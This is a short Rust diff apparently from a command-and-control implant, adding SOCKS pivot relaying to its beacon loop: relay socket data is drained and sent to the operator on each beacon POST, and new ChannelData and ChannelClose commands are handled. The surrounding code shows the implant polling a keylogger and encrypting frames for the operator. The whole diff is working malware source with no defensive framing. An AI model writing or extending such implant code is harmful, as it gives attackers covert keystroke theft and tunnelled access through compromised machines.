@@ -95,6 +95,13 @@ pub unsafe fn beacon_loop() {
         // case. (Coarse: ~1 sample per sleep interval — see keylog.rs docs.)
         crate::keylog::poll_once();
 
+        // Drain relay sockets — bytes read since last cycle ride as Channel
+        // data on this POST. task_id 0 marks async channel data (correlated by
+        // Response::Channel.chan on the operator side, not by task_id).
+        for r in crate::pivot::pump_channels() {
+            pending.push(TaskResponse { task_id: 0, response: r });
+        }
+
         let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
         counter += 1;
         pending.clear();
@@ -358,6 +365,9 @@ fn execute(
         Command::Socks { chan, op, addr, port } => {
             vec![crate::pivot::do_socks(chan, op, &addr, port)]
         }
+        // Relay data/close: forward to the channel table (pivot.rs).
+        Command::ChannelData { chan, data } => vec![crate::pivot::channel_data(chan, &data)],
+        Command::ChannelClose { chan } => vec![crate::pivot::channel_close(chan)],
     }
 }
 
